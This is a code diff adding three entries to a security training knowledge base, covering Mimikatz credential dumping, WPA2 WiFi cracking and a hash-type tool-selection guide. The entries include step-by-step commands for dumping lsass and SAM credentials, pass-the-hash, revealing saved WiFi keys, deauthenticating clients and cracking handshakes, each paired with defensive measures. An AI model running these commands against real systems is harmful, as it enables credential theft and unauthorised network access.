@@ -291,6 +291,126 @@ KNOWLEDGE_BASE = {
     ]
 ),
 
+
+# ---------------------------------------------------------------------------
+# MIMIKATZ — Windows Credential Extraction
+# ---------------------------------------------------------------------------
+"mimikatz": EducationContent(
+    topic="Mimikatz — Windows Credential Extraction",
+    what="Mimikatz is a post-exploitation tool that reads credential data from "
+         "Windows memory. It targets lsass.exe (Local Security Authority Subsystem "
+         "Service) to extract NTLM hashes, Kerberos tickets, and sometimes plaintext "
+         "passwords. IMPORTANT: Mimikatz is Windows authentication ONLY. It cannot "
+         "crack WiFi passwords, Linux credentials, or web passwords.",
+    why="After gaining initial access, credentials let you move laterally, escalate "
+        "privileges, and persist. A single set of admin credentials from Mimikatz "
+        "can unlock an entire domain. sekurlsa::logonpasswords is often the fastest "
+        "path from foothold to Domain Admin.",
+    how="Core workflow:\n"
+        "1. Run as Administrator (or SYSTEM)\n"
+        "2. privilege::debug — grants SeDebugPrivilege to read lsass\n"
+        "3. sekurlsa::logonpasswords — dumps NTLM hashes + plaintext (if WDigest on)\n"
+        "4. lsadump::sam — dumps local SAM database (needs SYSTEM)\n"
+        "5. lsadump::dcsync /user:krbtgt — pulls domain hashes without touching lsass\n"
+        "6. sekurlsa::pth /user:X /ntlm:HASH /run:cmd.exe — Pass-the-Hash\n\n"
+        "Offline method (stealthier):\n"
+        "  rundll32 comsvcs.dll MiniDump <lsass_pid> C:\\lsass.dmp full\n"
+        "  Then: sekurlsa::minidump lsass.dmp → sekurlsa::logonpasswords",
+    defend="1. Enable Credential Guard (virtualizes lsass — blocks Mimikatz).\n"
+           "2. Add sensitive accounts to Protected Users group.\n"
+           "3. Enable PPL (Protected Process Light) on lsass.\n"
+           "4. Disable WDigest authentication (prevents plaintext creds).\n"
+           "5. Monitor: Sysmon Event 10 (lsass access), Windows Event 4648.",
+    real_world="Mimikatz was used in the NotPetya attack (2017) to spread laterally "
+               "across networks by harvesting credentials from memory and using them "
+               "to authenticate to other machines via Pass-the-Hash.",
+    difficulty="Intermediate",
+    references=[
+        "https://github.com/gentilkiwi/mimikatz",
+        "https://attack.mitre.org/techniques/T1003/001/",
+    ]
+),
+
+# ---------------------------------------------------------------------------
+# WIFI / WIRELESS — Password Recovery and WPA2 Cracking
+# ---------------------------------------------------------------------------
+"wifi_cracking": EducationContent(
+    topic="WiFi Password Recovery and WPA2 Cracking",
+    what="WiFi password attacks have THREE completely different paths depending "
+         "on your situation. The correct tool depends on what you have access to. "
+         "WiFi uses WPA2 (PBKDF2-HMAC-SHA1) — a completely different algorithm than "
+         "Windows NTLM. Mimikatz, John, and NTLM crackers DO NOT work on WiFi hashes.",
+    why="Wireless credentials are a common initial access vector. A cracked WiFi "
+        "password gives network access. Saved WiFi profiles on a compromised machine "
+        "can reveal passwords to corporate, home, or client networks the machine "
+        "has ever connected to.",
+    how="PATH 1 — Machine already has saved WiFi (fastest, no cracking):\n"
+        "  netsh wlan show profiles\n"
+        "  netsh wlan show profile name='SSID' key=clear\n"
+        "  Look for: Key Content = <plaintext password>\n\n"
+        "PATH 2 — Capture and crack WPA2 handshake:\n"
+        "  airmon-ng check kill && airmon-ng start wlan0\n"
+        "  airodump-ng -c CH --bssid AP_MAC -w capture wlan0mon\n"
+        "  aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon  (force reconnect)\n"
+        "  hcxpcapngtool -o capture.hc22000 capture-01.cap\n"
+        "  hashcat -m 22000 capture.hc22000 rockyou.txt\n\n"
+        "PATH 3 — PMKID attack (no clients needed):\n"
+        "  hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1\n"
+        "  hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng\n"
+        "  hashcat -m 22000 pmkid.hc22000 rockyou.txt",
+    defend="1. Use WPA3 — immune to PMKID and offline dictionary attacks.\n"
+           "2. Long random passphrase (20+ chars) — dictionary attacks fail.\n"
+           "3. 802.11w (Management Frame Protection) — blocks deauth attacks.\n"
+           "4. WIDS (Wireless IDS) — alerts on rogue APs and deauth floods.\n"
+           "5. WPA2-Enterprise with certificates — no shared password to crack.",
+    real_world="Wardriving studies consistently find 20-30% of WPA2 networks use "
+               "passwords in the rockyou.txt wordlist. Most home networks are "
+               "cracked within minutes. PMKID attacks require only seconds of "
+               "proximity to the AP — no clients needed.",
+    difficulty="Beginner",
+    references=[
+        "https://www.aircrack-ng.org/documentation.html",
+        "https://hashcat.net/wiki/doku.php?id=hashcat",
+    ]
+),
+
+# ---------------------------------------------------------------------------
+# WIRELESS TOOL SELECTION — Decision tree for common confusion
+# ---------------------------------------------------------------------------
+"wireless_tool_selection": EducationContent(
+    topic="Wireless vs Windows Credentials — Tool Selection Guide",
+    what="The most common student mistake: using the wrong tool for the credential "
+         "type. Mimikatz is for Windows authentication (NTLM/Kerberos). Aircrack/"
+         "hashcat are for WiFi (WPA2/PBKDF2). These are completely different "
+         "cryptographic systems with no overlap.",
+    why="Using the wrong tool wastes time and produces no results. Understanding "
+        "the underlying crypto tells you instantly which tool to reach for.",
+    how="DECISION TREE:\n"
+        "Q: What do I have?\n"
+        "  .cap/.pcapng file from WiFi → hashcat -m 22000 or aircrack-ng\n"
+        "  Windows machine with saved WiFi → netsh wlan show profile key=clear\n"
+        "  NTLM hash (from SAM/lsass) → hashcat -m 1000 or Mimikatz PTH\n"
+        "  NTLMv2 net-hash (from Responder) → hashcat -m 5600\n"
+        "  Kerberos TGS ticket → hashcat -m 13100 (Kerberoasting)\n\n"
+        "HASH TYPE CHEAT SHEET:\n"
+        "  WPA2 PBKDF2   → hashcat mode 22000\n"
+        "  NTLM           → hashcat mode 1000\n"
+        "  NTLMv2         → hashcat mode 5600\n"
+        "  Kerberos TGS   → hashcat mode 13100\n"
+        "  MD5            → hashcat mode 0\n"
+        "  SHA-256        → hashcat mode 1400",
+    defend="N/A — this is a tool selection reference entry.",
+    real_world="During a pentest, a tester found a .cap file on a compromised workstation. "
+               "They ran Mimikatz against it expecting WiFi creds — got nothing. "
+               "The correct move: hcxpcapngtool to convert, then hashcat -m 22000. "
+               "Password cracked in 4 minutes.",
+    difficulty="Beginner",
+    references=[
+        "https://hashcat.net/wiki/doku.php?id=hashcat",
+        "https://attack.mitre.org/techniques/T1040/",
+    ]
+),
+
 }  # End KNOWLEDGE_BASE
 
 
